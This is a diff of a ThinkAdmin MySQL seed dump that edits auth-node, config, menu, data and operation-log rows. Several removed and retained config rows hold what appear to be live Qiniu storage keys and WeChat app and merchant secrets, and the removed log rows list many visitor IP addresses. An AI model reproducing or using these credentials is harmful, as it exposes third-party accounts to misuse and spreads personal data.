-INSERT INTO `system_auth_node` VALUES (1384, 2, 'data/shop_goods_cate/remove');
-INSERT INTO `system_auth_node` VALUES (1385, 2, 'data/shop_goods_mark');
-INSERT INTO `system_auth_node` VALUES (1386, 2, 'data/shop_goods_mark/index');
-INSERT INTO `system_auth_node` VALUES (1387, 2, 'data/shop_goods_mark/add');
-INSERT INTO `system_auth_node` VALUES (1388, 2, 'data/shop_goods_mark/edit');
-INSERT INTO `system_auth_node` VALUES (1389, 2, 'data/shop_goods_mark/state');
-INSERT INTO `system_auth_node` VALUES (1390, 2, 'data/shop_goods_mark/remove');
-INSERT INTO `system_auth_node` VALUES (1391, 2, 'data/shop_order');
-INSERT INTO `system_auth_node` VALUES (1392, 2, 'data/shop_order/index');
-INSERT INTO `system_auth_node` VALUES (1393, 2, 'data/shop_order/truck');
-INSERT INTO `system_auth_node` VALUES (1394, 2, 'data/shop_order/truckquery');
-INSERT INTO `system_auth_node` VALUES (1395, 2, 'data/shop_order/cancel');
-INSERT INTO `system_auth_node` VALUES (1396, 2, 'data/shop_order_send');
-INSERT INTO `system_auth_node` VALUES (1397, 2, 'data/shop_order_send/index');
-INSERT INTO `system_auth_node` VALUES (1398, 2, 'data/shop_order_service');
-INSERT INTO `system_auth_node` VALUES (1399, 2, 'data/shop_order_service/index');
-INSERT INTO `system_auth_node` VALUES (1400, 2, 'data/shop_truck_company');
-INSERT INTO `system_auth_node` VALUES (1401, 2, 'data/shop_truck_company/index');
-INSERT INTO `system_auth_node` VALUES (1402, 2, 'data/shop_truck_company/add');
-INSERT INTO `system_auth_node` VALUES (1403, 2, 'data/shop_truck_company/edit');
-INSERT INTO `system_auth_node` VALUES (1404, 2, 'data/shop_truck_company/state');
-INSERT INTO `system_auth_node` VALUES (1405, 2, 'data/shop_truck_company/remove');
-INSERT INTO `system_auth_node` VALUES (1406, 2, 'data/shop_truck_company/synchronize');
-INSERT INTO `system_auth_node` VALUES (1407, 2, 'data/shop_truck_template');
-INSERT INTO `system_auth_node` VALUES (1408, 2, 'data/shop_truck_template/index');
-INSERT INTO `system_auth_node` VALUES (1409, 2, 'data/shop_truck_template/region');
-INSERT INTO `system_auth_node` VALUES (1410, 2, 'data/shop_truck_template/add');
-INSERT INTO `system_auth_node` VALUES (1411, 2, 'data/shop_truck_template/edit');
-INSERT INTO `system_auth_node` VALUES (1412, 2, 'data/shop_truck_template/state');
-INSERT INTO `system_auth_node` VALUES (1413, 2, 'data/shop_truck_template/remove');
-INSERT INTO `system_auth_node` VALUES (1414, 2, 'data/user');
-INSERT INTO `system_auth_node` VALUES (1415, 2, 'data/user/index');
-INSERT INTO `system_auth_node` VALUES (1416, 2, 'data/user/state');
-INSERT INTO `system_auth_node` VALUES (1417, 2, 'data/user_message');
-INSERT INTO `system_auth_node` VALUES (1418, 2, 'data/user_message/index');
-INSERT INTO `system_auth_node` VALUES (1419, 2, 'data/user_message/config');
-INSERT INTO `system_auth_node` VALUES (1420, 2, 'data/user_message/remove');
-INSERT INTO `system_auth_node` VALUES (1421, 4, 'admin');
-INSERT INTO `system_auth_node` VALUES (1422, 4, 'admin/auth');
-INSERT INTO `system_auth_node` VALUES (1423, 4, 'admin/auth/index');
-INSERT INTO `system_auth_node` VALUES (1424, 4, 'admin/auth/add');
-INSERT INTO `system_auth_node` VALUES (1425, 4, 'admin/auth/edit');
-INSERT INTO `system_auth_node` VALUES (1426, 4, 'admin/auth/state');
-INSERT INTO `system_auth_node` VALUES (1427, 4, 'admin/auth/apply');
-INSERT INTO `system_auth_node` VALUES (1428, 4, 'admin/auth/remove');
-INSERT INTO `system_auth_node` VALUES (1429, 4, 'admin/config');
-INSERT INTO `system_auth_node` VALUES (1430, 4, 'admin/config/index');
-INSERT INTO `system_auth_node` VALUES (1431, 4, 'admin/config/system');
-INSERT INTO `system_auth_node` VALUES (1432, 4, 'admin/config/storage');
-INSERT INTO `system_auth_node` VALUES (1433, 4, 'admin/menu');
-INSERT INTO `system_auth_node` VALUES (1434, 4, 'admin/menu/index');
-INSERT INTO `system_auth_node` VALUES (1435, 4, 'admin/menu/add');
-INSERT INTO `system_auth_node` VALUES (1436, 4, 'admin/menu/edit');
-INSERT INTO `system_auth_node` VALUES (1437, 4, 'admin/menu/state');
-INSERT INTO `system_auth_node` VALUES (1438, 4, 'admin/menu/remove');
-INSERT INTO `system_auth_node` VALUES (1439, 4, 'admin/module');
-INSERT INTO `system_auth_node` VALUES (1440, 4, 'admin/module/index');
-INSERT INTO `system_auth_node` VALUES (1441, 4, 'admin/module/install');
-INSERT INTO `system_auth_node` VALUES (1442, 4, 'admin/module/change');
-INSERT INTO `system_auth_node` VALUES (1443, 4, 'admin/oplog');
-INSERT INTO `system_auth_node` VALUES (1444, 4, 'admin/oplog/index');
-INSERT INTO `system_auth_node` VALUES (1445, 4, 'admin/oplog/clear');
-INSERT INTO `system_auth_node` VALUES (1446, 4, 'admin/oplog/remove');
-INSERT INTO `system_auth_node` VALUES (1447, 4, 'admin/queue');
-INSERT INTO `system_auth_node` VALUES (1448, 4, 'admin/queue/index');
-INSERT INTO `system_auth_node` VALUES (1449, 4, 'admin/queue/redo');
-INSERT INTO `system_auth_node` VALUES (1450, 4, 'admin/queue/clean');
-INSERT INTO `system_auth_node` VALUES (1451, 4, 'admin/queue/remove');
-INSERT INTO `system_auth_node` VALUES (1452, 4, 'admin/user');
-INSERT INTO `system_auth_node` VALUES (1453, 4, 'admin/user/index');
-INSERT INTO `system_auth_node` VALUES (1454, 4, 'admin/user/add');
-INSERT INTO `system_auth_node` VALUES (1455, 4, 'admin/user/edit');
-INSERT INTO `system_auth_node` VALUES (1456, 4, 'admin/user/pass');
-INSERT INTO `system_auth_node` VALUES (1457, 4, 'admin/user/state');
-INSERT INTO `system_auth_node` VALUES (1458, 4, 'admin/user/remove');
-INSERT INTO `system_auth_node` VALUES (1459, 13, 'data');
-INSERT INTO `system_auth_node` VALUES (1460, 13, 'data/news_item');
-INSERT INTO `system_auth_node` VALUES (1461, 13, 'data/news_item/edit');
-INSERT INTO `system_auth_node` VALUES (1462, 13, 'data/news_item/state');
-INSERT INTO `system_auth_node` VALUES (1463, 13, 'data/news_mark');
-INSERT INTO `system_auth_node` VALUES (1464, 13, 'data/news_mark/edit');
-INSERT INTO `system_auth_node` VALUES (1465, 13, 'data/shop_goods');
-INSERT INTO `system_auth_node` VALUES (1466, 13, 'data/shop_goods/edit');
-INSERT INTO `system_auth_node` VALUES (1467, 13, 'data/shop_truck_company');
-INSERT INTO `system_auth_node` VALUES (1468, 13, 'data/shop_truck_company/add');
-INSERT INTO `system_auth_node` VALUES (1469, 13, 'data/shop_truck_company/edit');
-INSERT INTO `system_auth_node` VALUES (1470, 13, 'data/shop_truck_company/state');
 
 -- ----------------------------
 -- Table structure for system_config
@@ -5155,52 +4622,32 @@ CREATE TABLE `system_config`  (
   `value` varchar(2048) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL DEFAULT '' COMMENT '配置值',
   INDEX `idx_system_config_type`(`type`) USING BTREE,
   INDEX `idx_system_config_name`(`name`) USING BTREE
-) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-配置' ROW_FORMAT = Compact;
+) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-配置' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of system_config
 -- ----------------------------
 INSERT INTO `system_config` VALUES ('base', 'app_name', 'ThinkAdmin');
-INSERT INTO `system_config` VALUES ('base', 'app_version', 'v6.0');
+INSERT INTO `system_config` VALUES ('base', 'app_version', 'v6');
 INSERT INTO `system_config` VALUES ('base', 'beian', '');
 INSERT INTO `system_config` VALUES ('base', 'miitbeian', '粤ICP备16006642号-2');
-INSERT INTO `system_config` VALUES ('base', 'oplog_days', '3');
-INSERT INTO `system_config` VALUES ('base', 'oplog_state', '1');
 INSERT INTO `system_config` VALUES ('base', 'site_copy', '©版权所有 2014-2020 楚才科技');
-INSERT INTO `system_config` VALUES ('base', 'site_icon', 'https://v6.thinkadmin.top/upload/f47b8fe06e38ae99/08e8398da45583b9.png');
+INSERT INTO `system_config` VALUES ('base', 'site_icon', 'https://v6.thinkadmin.top/upload/f4/7b8fe06e38ae9908e8398da45583b9.png');
 INSERT INTO `system_config` VALUES ('base', 'site_name', 'ThinkAdmin');
 INSERT INTO `system_config` VALUES ('base', 'xpath', 'admin');
-INSERT INTO `system_config` VALUES ('data', 'wxapp_appid', 'wx6bb7b70258da09c6');
-INSERT INTO `system_config` VALUES ('data', 'wxapp_appkey', '4cdab4affa9c160e935a24a2860ff7f0');
-INSERT INTO `system_config` VALUES ('data', 'wxapp_mch_id', '');
-INSERT INTO `system_config` VALUES ('data', 'wxapp_mch_key', '');
-INSERT INTO `system_config` VALUES ('storage', 'alioss_http_protocol', 'http');
 INSERT INTO `system_config` VALUES ('storage', 'allow_exts', 'doc,gif,icon,jpg,mp3,mp4,p12,pem,png,rar,xls,xlsx');
 INSERT INTO `system_config` VALUES ('storage', 'link_type', 'none');
 INSERT INTO `system_config` VALUES ('storage', 'local_http_domain', '');
 INSERT INTO `system_config` VALUES ('storage', 'local_http_protocol', 'follow');
-INSERT INTO `system_config` VALUES ('storage', 'qiniu_access_key', 'OAFHGzCgZjod2-s4xr-g5ptkXsNbxDO_t2fozIEC');
-INSERT INTO `system_config` VALUES ('storage', 'qiniu_bucket', 'static');
-INSERT INTO `system_config` VALUES ('storage', 'qiniu_http_domain', 'static.ctolog.com');
-INSERT INTO `system_config` VALUES ('storage', 'qiniu_http_protocol', 'http');
-INSERT INTO `system_config` VALUES ('storage', 'qiniu_region', '华东');
-INSERT INTO `system_config` VALUES ('storage', 'qiniu_secret_key', 'gy0aYdSFMSayQ4kMkgUeEeJRLThVjLpUJoPFxd-Z');
-INSERT INTO `system_config` VALUES ('storage', 'txcos_http_protocol', 'http');
 INSERT INTO `system_config` VALUES ('storage', 'type', 'local');
-INSERT INTO `system_config` VALUES ('wechat', 'appid', 'wx60a43dd8161666d4');
-INSERT INTO `system_config` VALUES ('wechat', 'appkey', '7d0e4a487c6258b2232294b6ef0adb9e');
-INSERT INTO `system_config` VALUES ('wechat', 'appsecret', '5bfaef5c5f43067924a2448111d1dba0');
-INSERT INTO `system_config` VALUES ('wechat', 'encodingaeskey', 'gsMy8Sy1g8SmsDMumcYAsd2suNCSNGSSsg219G00019');
-INSERT INTO `system_config` VALUES ('wechat', 'mch_id', '148283781210');
-INSERT INTO `system_config` VALUES ('wechat', 'mch_key', '22221231212322221231212322221231');
-INSERT INTO `system_config` VALUES ('wechat', 'mch_ssl_cer', '9d/e1687b93a96aef8bc0d2b03c43be21.pem');
-INSERT INTO `system_config` VALUES ('wechat', 'mch_ssl_key', '9d/e1687b93a96aef8bc0d2b03c43be21.pem');
-INSERT INTO `system_config` VALUES ('wechat', 'mch_ssl_p12', '');
-INSERT INTO `system_config` VALUES ('wechat', 'mch_ssl_type', 'none');
-INSERT INTO `system_config` VALUES ('wechat', 'thr_appid', 'wx05386952e7470f7a');
-INSERT INTO `system_config` VALUES ('wechat', 'thr_appkey', '4fff48fc75a01891b893866f8cc9b7d4');
-INSERT INTO `system_config` VALUES ('wechat', 'token', 'eqwejudadsadasd');
-INSERT INTO `system_config` VALUES ('wechat', 'type', 'api');
+INSERT INTO `system_config` VALUES ('wechat', 'type', 'thr');
+INSERT INTO `system_config` VALUES ('wechat', 'thr_appid', 'wx60a43dd8161666d4');
+INSERT INTO `system_config` VALUES ('wechat', 'thr_appkey', '7d0e4a487c6258b2232294b6ef0adb9e');
+INSERT INTO `system_config` VALUES ('storage', 'qiniu_http_protocol', 'http');
+INSERT INTO `system_config` VALUES ('storage', 'txcos_http_protocol', 'http');
+INSERT INTO `system_config` VALUES ('data', 'wxapp_appid', 'wx6bb7b70258da09c6');
+INSERT INTO `system_config` VALUES ('data', 'wxapp_appkey', '4cdab4affa9c160e935a24a2860ff7f0');
+INSERT INTO `system_config` VALUES ('storage', 'alioss_http_protocol', 'http');
 
 -- ----------------------------
 -- Table structure for system_data
@@ -5212,15 +4659,13 @@ CREATE TABLE `system_data`  (
   `value` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NULL COMMENT '配置值',
   PRIMARY KEY (`id`) USING BTREE,
   INDEX `idx_system_data_name`(`name`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-数据' ROW_FORMAT = Compact;
+) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-数据' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of system_data
 -- ----------------------------
-INSERT INTO `system_data` VALUES (1, 'wechat_menu_data', 'a:1:{i:0;a:2:{s:4:\"name\";s:6:\"123213\";s:10:\"sub_button\";a:1:{i:0;a:3:{s:4:\"name\";s:4:\"test\";s:4:\"type\";s:5:\"click\";s:3:\"key\";s:6:\"你好\";}}}}');
-INSERT INTO `system_data` VALUES (2, 'about', 'a:1:{s:7:\"content\";s:11:\"<p>gsdg</p>\";}');
-INSERT INTO `system_data` VALUES (3, 'slider', 'a:2:{i:0;a:3:{s:3:\"img\";s:70:\"https://v6.thinkadmin.top/upload/58/98e582eb901c767681e291e0db2c60.jpg\";s:4:\"rule\";s:1:\"#\";s:4:\"name\";s:1:\"#\";}i:1;a:3:{s:3:\"img\";s:70:\"https://v6.thinkadmin.top/upload/38/ce500ba92c3cb00035b4e4aaab6b31.jpg\";s:4:\"rule\";s:1:\"#\";s:4:\"name\";s:1:\"#\";}}');
-INSERT INTO `system_data` VALUES (4, 'agreement', 'a:1:{s:7:\"content\";s:92:\"<p>&nbsp;</p>\r\n\r\n<p>\r\n<audio controls=\"controls\" style=\"display: none;\">&nbsp;</audio>\r\n</p>\";}');
+INSERT INTO `system_data` VALUES (1, '关于我们', 'a:2:{s:4:\"name\";s:8:\"23512322\";s:7:\"content\";s:16:\"<p>512351235</p>\";}');
+INSERT INTO `system_data` VALUES (2, '用户协议', 'a:2:{s:4:\"name\";s:7:\"2315123\";s:7:\"content\";s:16:\"<p>512351235</p>\";}');
 
 -- ----------------------------
 -- Table structure for system_menu
@@ -5268,7 +4713,7 @@ INSERT INTO `system_menu` VALUES (66, 60, '默认回复配置', 'layui-icon layu
 INSERT INTO `system_menu` VALUES (67, 0, '控制台', '', '', '#', '', '_self', 300, 1, '2020-07-13 06:51:46');
 INSERT INTO `system_menu` VALUES (68, 67, '数据管理（接口案例）', '', '', '#', '', '_self', 0, 1, '2020-07-13 06:51:54');
 INSERT INTO `system_menu` VALUES (70, 68, '文章内容管理', 'layui-icon layui-icon-template', '', 'data/news_item/index', '', '_self', 10, 1, '2020-07-13 06:52:26');
-INSERT INTO `system_menu` VALUES (71, 68, '轮播图片管理', 'layui-icon layui-icon-carousel', 'data/config/sliderhome', 'data/config/sliderhome', '', '_self', 8, 1, '2020-07-14 01:17:02');
+INSERT INTO `system_menu` VALUES (71, 68, '轮播图片管理', 'layui-icon layui-icon-carousel', 'data/config/sliderhome', 'data/config/sliderhome', '', '_self', 30, 1, '2020-07-14 01:17:02');
 INSERT INTO `system_menu` VALUES (73, 67, '商城管理（开发中）', '', '', '#', '', '_self', 0, 1, '2020-09-08 02:51:30');
 INSERT INTO `system_menu` VALUES (75, 73, '商品分类管理', 'layui-icon layui-icon-tabs', 'data/shop_goods_cate/index', 'data/shop_goods_cate/index', '', '_self', 70, 1, '2020-09-08 03:35:58');
 INSERT INTO `system_menu` VALUES (76, 73, '商品数据管理', 'layui-icon layui-icon-star', 'data/shop_goods/index', 'data/shop_goods/index', '', '_self', 90, 1, '2020-09-08 07:13:19');
@@ -5301,451 +4746,22 @@ CREATE TABLE `system_oplog`  (
   `username` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL DEFAULT '' COMMENT '操作人用户名',
   `create_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
   PRIMARY KEY (`id`) USING BTREE
-) ENGINE = InnoDB AUTO_INCREMENT = 5816 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-日志' ROW_FORMAT = Compact;
+) ENGINE = InnoDB AUTO_INCREMENT = 12 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_general_ci COMMENT = '系统-日志' ROW_FORMAT = COMPACT;
 
 -- ----------------------------
 -- Records of system_oplog
 -- ----------------------------
-INSERT INTO `system_oplog` VALUES (5373, 'admin/api.plugs/optimize', '220.249.17.234', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-22 12:59:40');
-INSERT INTO `system_oplog` VALUES (5374, 'admin/login/index', '43.254.90.158', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:00:59');
-INSERT INTO `system_oplog` VALUES (5375, 'admin/login/index', '14.107.84.193', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:07:13');
-INSERT INTO `system_oplog` VALUES (5376, 'admin/login/index', '120.200.144.24', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:08:00');
-INSERT INTO `system_oplog` VALUES (5377, 'admin/login/index', '111.206.85.106', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:10:45');
-INSERT INTO `system_oplog` VALUES (5378, 'admin/login/index', '111.206.85.106', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:31:21');
-INSERT INTO `system_oplog` VALUES (5379, 'admin/login/index', '110.152.135.91', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:31:46');
-INSERT INTO `system_oplog` VALUES (5380, 'admin/login/index', '222.65.227.51', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:33:03');
-INSERT INTO `system_oplog` VALUES (5381, 'admin/api.plugs/debug', '111.206.85.106', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-22 13:38:46');
-INSERT INTO `system_oplog` VALUES (5382, 'admin/api.plugs/debug', '111.206.85.106', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-22 13:38:49');
-INSERT INTO `system_oplog` VALUES (5383, 'admin/api.plugs/optimize', '222.65.227.51', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-22 13:38:59');
-INSERT INTO `system_oplog` VALUES (5384, 'admin/login/index', '60.25.162.9', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:39:18');
-INSERT INTO `system_oplog` VALUES (5385, 'admin/login/index', '115.57.139.64', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:42:47');
-INSERT INTO `system_oplog` VALUES (5386, 'admin/login/index', '183.6.116.12', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:43:53');
-INSERT INTO `system_oplog` VALUES (5387, 'admin/login/index', '117.170.102.53', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:48:07');
-INSERT INTO `system_oplog` VALUES (5388, 'admin/login/index', '222.86.166.170', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:48:54');
-INSERT INTO `system_oplog` VALUES (5389, 'admin/login/index', '218.19.207.236', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 13:59:43');
-INSERT INTO `system_oplog` VALUES (5390, 'admin/login/index', '113.109.110.159', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:09:00');
-INSERT INTO `system_oplog` VALUES (5391, 'admin/login/index', '1.80.39.116', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:12:28');
-INSERT INTO `system_oplog` VALUES (5392, 'admin/login/index', '103.35.72.175', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:12:39');
-INSERT INTO `system_oplog` VALUES (5393, 'admin/login/index', '218.17.65.13', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:21:39');
-INSERT INTO `system_oplog` VALUES (5394, 'admin/login/index', '171.113.25.9', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:22:08');
-INSERT INTO `system_oplog` VALUES (5395, 'admin/api.plugs/debug', '218.17.65.13', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-22 14:22:49');
-INSERT INTO `system_oplog` VALUES (5396, 'admin/login/index', '218.69.156.131', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:30:45');
-INSERT INTO `system_oplog` VALUES (5397, 'admin/login/index', '221.237.158.197', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:32:19');
-INSERT INTO `system_oplog` VALUES (5398, 'admin/login/index', '114.252.253.33', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:32:47');
-INSERT INTO `system_oplog` VALUES (5399, 'admin/login/index', '106.91.4.26', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:49:06');
-INSERT INTO `system_oplog` VALUES (5400, 'admin/login/index', '121.237.173.198', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:52:19');
-INSERT INTO `system_oplog` VALUES (5401, 'admin/login/index', '121.69.47.30', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:53:50');
-INSERT INTO `system_oplog` VALUES (5402, 'admin/login/index', '113.104.224.204', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:57:34');
-INSERT INTO `system_oplog` VALUES (5403, 'admin/login/index', '124.228.220.111', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 14:59:18');
-INSERT INTO `system_oplog` VALUES (5404, 'admin/api.plugs/debug', '124.228.220.111', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-22 14:59:44');
-INSERT INTO `system_oplog` VALUES (5405, 'admin/login/index', '58.220.220.163', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:03:36');
-INSERT INTO `system_oplog` VALUES (5406, 'admin/api.plugs/debug', '124.228.220.111', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-22 15:04:20');
-INSERT INTO `system_oplog` VALUES (5407, 'admin/login/index', '121.204.59.80', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:04:53');
-INSERT INTO `system_oplog` VALUES (5408, 'admin/login/index', '113.109.55.105', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:05:13');
-INSERT INTO `system_oplog` VALUES (5409, 'admin/login/index', '36.100.188.147', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:24:19');
-INSERT INTO `system_oplog` VALUES (5410, 'admin/login/index', '119.96.8.75', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:26:21');
-INSERT INTO `system_oplog` VALUES (5411, 'admin/login/index', '221.219.212.178', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:27:41');
-INSERT INTO `system_oplog` VALUES (5412, 'admin/login/index', '116.52.95.187', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:30:40');
-INSERT INTO `system_oplog` VALUES (5413, 'admin/login/index', '119.165.50.74', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:31:40');
-INSERT INTO `system_oplog` VALUES (5414, 'admin/login/index', '119.123.79.229', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:35:26');
-INSERT INTO `system_oplog` VALUES (5415, 'admin/login/index', '223.166.129.65', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:43:16');
-INSERT INTO `system_oplog` VALUES (5416, 'admin/login/index', '119.123.72.231', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:47:48');
-INSERT INTO `system_oplog` VALUES (5417, 'admin/login/index', '113.109.110.159', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:49:38');
-INSERT INTO `system_oplog` VALUES (5418, 'admin/login/index', '111.206.85.106', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:53:46');
-INSERT INTO `system_oplog` VALUES (5419, 'admin/login/index', '61.52.129.43', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:55:13');
-INSERT INTO `system_oplog` VALUES (5420, 'admin/login/index', '106.8.216.30', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 15:56:00');
-INSERT INTO `system_oplog` VALUES (5421, 'admin/login/index', '117.136.66.131', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:04:29');
-INSERT INTO `system_oplog` VALUES (5422, 'admin/login/index', '125.86.165.199', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:05:51');
-INSERT INTO `system_oplog` VALUES (5423, 'admin/login/index', '171.8.134.26', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:05:51');
-INSERT INTO `system_oplog` VALUES (5424, 'admin/login/index', '113.102.225.70', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:14:34');
-INSERT INTO `system_oplog` VALUES (5425, 'admin/api.plugs/debug', '106.8.216.30', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-22 16:15:18');
-INSERT INTO `system_oplog` VALUES (5426, 'admin/api.plugs/debug', '106.8.216.30', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-22 16:15:23');
-INSERT INTO `system_oplog` VALUES (5427, 'admin/api.plugs/clearconfig', '113.102.225.70', '系统运维管理', '清理系统参数配置成功', 'admin', '2021-02-22 16:15:34');
-INSERT INTO `system_oplog` VALUES (5428, 'admin/api.plugs/optimize', '113.102.225.70', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-22 16:15:41');
-INSERT INTO `system_oplog` VALUES (5429, 'admin/login/index', '117.22.98.130', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:17:44');
-INSERT INTO `system_oplog` VALUES (5430, 'admin/login/index', '221.228.150.228', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:18:29');
-INSERT INTO `system_oplog` VALUES (5431, 'admin/login/index', '61.140.180.195', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:21:16');
-INSERT INTO `system_oplog` VALUES (5432, 'admin/login/index', '111.201.245.243', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:25:22');
-INSERT INTO `system_oplog` VALUES (5433, 'admin/login/index', '42.242.224.233', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:25:49');
-INSERT INTO `system_oplog` VALUES (5434, 'admin/login/index', '220.115.174.12', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:25:54');
-INSERT INTO `system_oplog` VALUES (5435, 'admin/login/index', '171.212.219.111', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:25:54');
-INSERT INTO `system_oplog` VALUES (5436, 'admin/login/index', '123.168.92.255', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:31:17');
-INSERT INTO `system_oplog` VALUES (5437, 'admin/login/index', '113.109.111.127', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:32:34');
-INSERT INTO `system_oplog` VALUES (5438, 'admin/login/index', '106.118.176.166', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:33:45');
-INSERT INTO `system_oplog` VALUES (5439, 'admin/login/index', '1.203.166.82', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:36:43');
-INSERT INTO `system_oplog` VALUES (5440, 'admin/login/index', '123.168.92.255', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:39:04');
-INSERT INTO `system_oplog` VALUES (5441, 'admin/login/index', '113.65.137.53', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 16:44:14');
-INSERT INTO `system_oplog` VALUES (5442, 'admin/login/index', '117.136.75.250', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 17:06:37');
-INSERT INTO `system_oplog` VALUES (5443, 'admin/login/index', '123.14.81.231', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 17:06:52');
-INSERT INTO `system_oplog` VALUES (5445, 'admin/api.plugs/debug', '123.14.81.231', '系统运维管理', '由产品模式切换为开发模式', 'admin', '2021-02-22 17:11:44');
-INSERT INTO `system_oplog` VALUES (5446, 'admin/api.plugs/debug', '123.14.81.231', '系统运维管理', '由开发模式切换为产品模式', 'admin', '2021-02-22 17:11:49');
-INSERT INTO `system_oplog` VALUES (5447, 'admin/login/index', '1.80.39.116', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 17:21:04');
-INSERT INTO `system_oplog` VALUES (5448, 'admin/login/index', '113.109.110.159', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 17:23:34');
-INSERT INTO `system_oplog` VALUES (5449, 'admin/api.plugs/optimize', '113.109.110.159', '系统运维管理', '创建数据库优化任务', 'admin', '2021-02-22 17:23:46');
-INSERT INTO `system_oplog` VALUES (5450, 'admin/login/index', '221.130.253.135', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 17:26:54');
-INSERT INTO `system_oplog` VALUES (5451, 'admin/login/index', '120.224.235.197', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 17:40:17');
-INSERT INTO `system_oplog` VALUES (5452, 'admin/login/index', '183.11.130.140', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 17:52:11');
-INSERT INTO `system_oplog` VALUES (5453, 'admin/login/index', '61.140.232.30', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 18:00:30');
-INSERT INTO `system_oplog` VALUES (5454, 'admin/login/index', '123.174.73.6', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 18:10:39');
-INSERT INTO `system_oplog` VALUES (5455, 'admin/login/index', '218.30.128.138', '系统用户登录', '登录系统后台成功', 'admin', '2021-02-22 18:26:08');
